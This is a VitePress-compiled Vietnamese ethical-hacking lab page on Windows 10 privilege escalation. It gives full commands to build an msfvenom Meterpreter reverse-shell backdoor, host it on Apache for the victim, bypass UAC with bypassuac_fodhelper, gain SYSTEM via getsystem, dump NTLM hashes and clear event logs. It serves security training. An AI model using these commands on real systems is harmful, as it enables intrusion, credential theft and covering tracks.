import{_ as n,c as t,a1 as a,o as s}from"./chunks/framework.BDxlaA_J.js";const g=JSON.parse('{"title":"Leo thang Đặc quyền","description":"","frontmatter":{},"headers":[],"relativePath":"vi/categories/ethical-hacking-labs/5-system-hacking/5-Escalating-Privileges.md","filePath":"vi/categories/ethical-hacking-labs/5-system-hacking/5-Escalating-Privileges.md"}'),h={name:"vi/categories/ethical-hacking-labs/5-system-hacking/5-Escalating-Privileges.md"};function i(c,e,o,p,r,l){return s(),t("div",null,e[0]||(e[0]=[a(`<h1 id="leo-thang-đac-quyen" tabindex="-1">Leo thang Đặc quyền <a class="header-anchor" href="#leo-thang-đac-quyen" aria-label="Permalink to &quot;Leo thang Đặc quyền&quot;">​</a></h1><p>Leo thang đặc quyền là hành vi lạm dụng lỗi, cấu hình sai hoặc sơ suất thiết kế trong hệ điều hành hoặc ứng dụng phần mềm để đạt được quyền truy cao hơn vào tài nguyên mà thường được bảo vệ khỏi ứng dụng hoặc người dùng.</p><p>Khi kẻ tấn công giành được quyền truy cập vào hệ thống mục tiêu, họ bắt đầu tìm cách khác nhau để leo thang đặc quyền trong hệ thống. Họ có thể khai thác lỗ hổng, lỗi thiết kế hoặc sơ suất cấu hình trong hệ điều hành hoặc ứng dụng phần mềm trên hệ thống mục tiêu để giành quyền truy cập nâng cao vào tài nguyên mà thường được bảo vệ. Leo thang đặc quyền có thể theo chiều <strong>dọc</strong> hoặc <strong>ngang</strong>.</p><h3 id="muc-tieu" tabindex="-1">Mục tiêu <a class="header-anchor" href="#muc-tieu" aria-label="Permalink to &quot;Mục tiêu&quot;">​</a></h3><ul><li>Trình bày cách leo thang đặc quyền trên máy nạn nhân bằng cách khai thác lỗ hổng.</li></ul><h3 id="yeu-cau" tabindex="-1">Yêu cầu <a class="header-anchor" href="#yeu-cau" aria-label="Permalink to &quot;Yêu cầu&quot;">​</a></h3><ul><li>Máy ảo Kali Linux.</li><li>Máy ảo Windows 10.</li></ul><h2 id="tao-backdoor" tabindex="-1">Tạo Backdoor <a class="header-anchor" href="#tao-backdoor" aria-label="Permalink to &quot;Tạo Backdoor&quot;">​</a></h2><p>Để tạo file thực thi độc hại, nhập lệnh này và đặt địa chỉ IP Kali vào tùy chọn <code>LHOST</code>:</p><p><code>msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b &quot;\\x00&quot; LHOST=10.0.2.42 -f exe &gt; Desktop/Exploit.exe</code></p><p>Lệnh này sẽ tạo file thực thi Windows có tên <strong>Exploit.exe</strong> và sẽ được lưu trên <strong>desktop</strong> của Kali.</p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/62f3153c4c87084931d3ec529bde0add9c8bf888/exploitexe.png" alt="exploit.exe"></p><h2 id="chia-se-file-exploit-exe" tabindex="-1">Chia sẻ file Exploit.exe <a class="header-anchor" href="#chia-se-file-exploit-exe" aria-label="Permalink to &quot;Chia sẻ file Exploit.exe&quot;">​</a></h2><p><strong>Đầu tiên</strong>, chúng ta cần thiết lập cấu hình apache và thư mục chia sẻ.</p><h3 id="cau-hinh-apache" tabindex="-1">Cấu hình Apache <a class="header-anchor" href="#cau-hinh-apache" aria-label="Permalink to &quot;Cấu hình Apache&quot;">​</a></h3><p><em>Nếu bạn chưa cài đặt apache2, chạy <strong>apt-get install apache2</strong>.</em></p><p>Điều hướng đến thư mục apache2, mở file cấu hình <strong>apache2.conf</strong>, và thêm một dòng mới: <code>vim /etc/apache2/apache2.conf</code></p><p>Thêm dòng mới với lệnh: <code>servername localhost</code> và lưu file.</p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/1523fa1d4fdbc682f9908f33a01fbc1e08ba283c/apacheconf.png" alt="apache.conf"></p><p>Tạo thư mục mới bên trong thư mục html: <code>mkdir /var/www/html/share/</code></p><p>Thay đổi <a href="https://www.tutonics.com/2012/12/linux-file-permissions-chmod-umask.html" target="_blank" rel="noreferrer">quyền</a> cho thư mục chia sẻ thành <strong>755</strong>: <code>chmod -R 755 /var/www/html/share/</code></p><p>Thay đổi quyền sở hữu của thư mục đó thành <strong>www-data</strong>: <code>chown -R www-data:www-data /var/www/html/share/</code></p><p><em>Để xem cấu hình của tùy chọn chia sẻ, nhập:</em><code>ls -la /var/www/html/ | grep share</code></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>drwxr-xr-x 2 www-data www-data  4096 Dec 18 20:52 share</span></span></code></pre></div><p>Bây giờ sao chép file độc hại vào vị trí chia sẻ: <code>cp /root/Desktop/Test.exe /var/www/html/share/</code></p><p>Khởi động dịch vụ apache để chạy http server: <code>service apache2 start</code></p><h2 id="thuc-hien-khai-thac" tabindex="-1">Thực hiện Khai thác <a class="header-anchor" href="#thuc-hien-khai-thac" aria-label="Permalink to &quot;Thực hiện Khai thác&quot;">​</a></h2><p>Khởi chạy Metasploit Framework bằng cách nhập:</p><p><code>msfconsole</code></p><p>Chọn <strong>multi/handler</strong> và đặt payload thành <strong>meterpreter/reverse_tcp</strong>:</p><p><code>use exploit/multi/handler</code><code>set payload windows/meterpreter/reverse_tcp</code></p><p>Đặt <strong>LHOST</strong> thành địa chỉ IP của Kali:</p><p><code>set LHOST 10.0.2.42</code></p><p>Bắt đầu khai thác trên nền:</p><p><code>exploit -j -z</code></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>[*] Exploit running as background job 0.</span></span>
<span class="line"><span>[*] Exploit completed, but no session was created.</span></span>
<span class="line"><span>[*] Started reverse TCP handler on 10.0.2.42:4444</span></span></code></pre></div><h2 id="chay-exploit" tabindex="-1">Chạy Exploit <a class="header-anchor" href="#chay-exploit" aria-label="Permalink to &quot;Chạy Exploit&quot;">​</a></h2><p>Chuyển sang máy <strong>Windows 10</strong>, khởi chạy <strong>trình duyệt</strong> và nhập URL:</p><p><code>http://10.0.2.42/share/</code> <em>(Thay đổi thành địa chỉ IP của Kali của bạn).</em></p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/b65a2a5858140f439e8de89c919d452668346884/shareexploit.png" alt="share-exploit"></p><p>Nhấp vào <strong>Exploit.exe</strong> để tải file backdoor. Khi file đã được tải, điều hướng đến vị trí tải và mở file để thực thi.</p><p>Nếu cửa sổ <strong>Open File - Security Warning</strong> xuất hiện, nhấp vào <strong>Run</strong>.</p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/87089f69512685222b66d10ab10832f0382538f9/securityWarningWin.png" alt="Sec Warning"></p><p>Chuyển lại máy Kali. Phiên Meterpreter đã được mở thành công, như hình dưới đây:</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>[*] Sending stage (180291 bytes) to 10.0.2.15</span></span>
<span class="line"><span>[*] Meterpreter session 1 opened (10.0.2.42:4444 -&gt; 10.0.2.15:49804) at 2019-12-18 21:04:09 -0500</span></span></code></pre></div><p>Để tương tác với các phiên có sẵn, bạn có thể sử dụng lệnh <code>sessions</code> hoặc <code>sessions -i</code> để liệt kê các phiên hiện tại đang mở. <strong>Để mở bất kỳ phiên nào, chọn ID bằng lệnh:</strong></p><p><code>sessions &lt;ID&gt;</code></p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/2b57cd80a9fdbe2dfd1bf4ad18f9df32f894a256/sessions.png" alt="sessions"></p><h2 id="thiet-lap-phien" tabindex="-1">Thiết lập Phiên <a class="header-anchor" href="#thiet-lap-phien" aria-label="Permalink to &quot;Thiết lập Phiên&quot;">​</a></h2><p><a href="https://www.blueliv.com/downloads/Meterpreter_cheat_sheet_v0.1.pdf" target="_blank" rel="noreferrer">[+] Meterpreter Cheat Sheet</a></p><p>Mở phiên Meterpreter hiện tại và nhập:</p><p><code>getuid</code></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>meterpreter &gt; getuid</span></span>
<span class="line"><span>Server username: DESKTOP-ICB2IQ4\\dummy</span></span></code></pre></div><p>Bạn sẽ nhận thấy rằng máy chủ Meterpreter đang chạy với đặc quyền người dùng bình thường. Bạn sẽ không thể thực thi các lệnh (chẳng hạn như <code>hashdump</code>, trích xuất hash tài khoản người dùng từ file <strong>SAM</strong>; <code>clearev</code>, xóa nhật ký sự kiện từ xa; v.v.) yêu cầu đặc quyền quản trị/root.</p><p>Hãy kiểm tra điều này bằng cách thực thi lệnh này:</p><p><code>run post/windows/gather/smart_hashdump</code></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>meterpreter &gt; run post/windows/gather/smart_hashdump</span></span>
<span class="line"><span></span></span>
<span class="line"><span>[*] Running module against DESKTOP-ICB2IQ4</span></span>
<span class="line"><span>[*] Hashes will be saved to the database if one is connected.</span></span>
<span class="line"><span>[+] Hashes will be saved in loot in JtR password file format to:</span></span>
<span class="line"><span>[*] /root/.msf4/loot/20191218220106_default_10.0.2.15_windows.hashes_986306.txt</span></span>
<span class="line"><span>[-] Insufficient privileges to dump hashes!</span></span></code></pre></div><p><strong>[-] Insufficient privileges to dump hashes!</strong></p><p>Lệnh không thể trích xuất hash từ file SAM trên Windows 10 và trả về lỗi Insufficient Privileges to dump hashes.</p><p>Từ đây, rõ ràng là máy chủ Meterpreter yêu cầu đặc quyền admin để thực hiện các hành động như vậy.</p><p>Bây giờ, chúng ta có thể thử leo thang đặc quyền bằng cách sử dụng lệnh <code>getsystem</code> cố gắng nâng cao đặc quyền người dùng.</p><p><code>getsystem -t 1</code></p><p><em>sử dụng kỹ thuật Service - <a href="https://securityintelligence.com/identifying-named-pipe-impersonation-and-other-malicious-privilege-escalation-techniques/" target="_blank" rel="noreferrer">Named Pipe Impersonation</a> (In Memory/Admin).</em></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>meterpreter &gt; getsystem -t 1</span></span>
<span class="line"><span>[-] priv_elevate_getsystem: Operation failed: Access is denied. The following was attempted:</span></span>
<span class="line"><span>[-] Named Pipe Impersonation (In Memory/Admin)</span></span></code></pre></div><p>Lệnh không thể leo thang đặc quyền và trả về lỗi <strong>(Access is Denied).</strong></p><p>Từ kết quả trên, rõ ràng là cấu hình bảo mật của máy Windows 10 đang chặn bạn giành quyền truy cập không giới hạn vào nó.</p><h2 id="thuc-hien-leo-thang-đac-quyen" tabindex="-1">Thực hiện Leo thang Đặc quyền <a class="header-anchor" href="#thuc-hien-leo-thang-đac-quyen" aria-label="Permalink to &quot;Thực hiện Leo thang Đặc quyền&quot;">​</a></h2><p>Chúng ta có thể thử bỏ qua cài đặt kiểm soát tài khoản người dùng đang chặn bạn giành quyền truy cập không giới hạn vào máy.</p><p>Di chuyển phiên Meterpreter hiện tại sang nền. Chỉ cần nhập <code>background</code>.</p><p>Sử dụng exploit <strong>bypassuac_fodhelper</strong> cho Windows: <code>use exploit/windows/local/bypassuac_fodhelper</code></p><p>Nhập <code>options</code> để xem cấu hình, và bạn sẽ thấy chỉ có cài đặt session, nhập <code>sessions</code> để xem ID của phiên meterpreter trước đó và đặt cho exploit hiện tại:</p><p><code>set SESSION &lt;ID&gt;</code></p><p>Nhập <code>run</code> để khai thác:</p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/fd2d00d7a9d552981f6422e0ab4dd04a6fe6d9b5/bypassuac_fodhelper.png" alt="run-bypassuac_fodhelper"></p><p><strong>Exploit BypassUAC đã bỏ qua thành công cài đặt UAC trên máy Windows 10 và một phiên Meterpreter khác đã được mở.</strong></p><p>Bây giờ, điều đầu tiên là kiểm tra trạng thái User ID hiện tại của Meterpreter bằng lệnh <code>getuid</code>. Bạn sẽ thấy rằng máy chủ Meterpreter vẫn đang chạy với <strong>đặc quyền người dùng bình thường</strong>.</p><p><code>getuid</code></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>meterpreter &gt; getuid</span></span>
<span class="line"><span>Server username: DESKTOP-ICB2IQ4\\dummy</span></span></code></pre></div><p>Tại giai đoạn này, chúng ta sẽ thử lại lệnh <code>getsystem</code> với tùy chọn <code>-t 1</code>, trong nỗ lực <strong>leo thang đặc quyền</strong>.</p><p><code>getsystem -i 1</code></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>meterpreter &gt; getsystem -i 1</span></span>
<span class="line"><span></span></span>
<span class="line"><span>...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</span></span></code></pre></div><p><strong>Lần này, lệnh đã leo thang đặc quyền người dùng thành công và trả về thông báo &quot;got system&quot;, như hình trên.</strong></p><p>Bây giờ, nhập <code>getuid</code> lại.</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>meterpreter &gt; getuid</span></span>
<span class="line"><span>Server username: NT AUTHORITY\\SYSTEM</span></span></code></pre></div><p>Phiên meterpreter hiện đang chạy với đặc quyền <strong>SYSTEM</strong> (<strong>NT AUTHORITY\\SYSTEM</strong>).</p><p>Hãy thử thu thập <strong>hash</strong> nằm trong file <strong>SAM</strong> của Windows 10 bằng cách nhập:</p><p><code>run post/windows/gather/smart_hashdump</code></p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/fd2d00d7a9d552981f6422e0ab4dd04a6fe6d9b5/hashdump.png" alt="getSystem"></p><p>Lần này, meterpreter đã trích xuất thành công hash NTLM và hiển thị chúng như hình trên. Do đó, chúng ta đã leo thang đặc quyền thành công bằng cách khai thác lỗ hổng của máy Windows 10.</p><p><strong>Bây giờ bạn có thể thực thi các lệnh như (clearev, xóa nhật ký sự kiện từ xa, v.v.)</strong></p>`,90)]))}const u=n(h,[["render",i]]);export{g as __pageData,u as default};
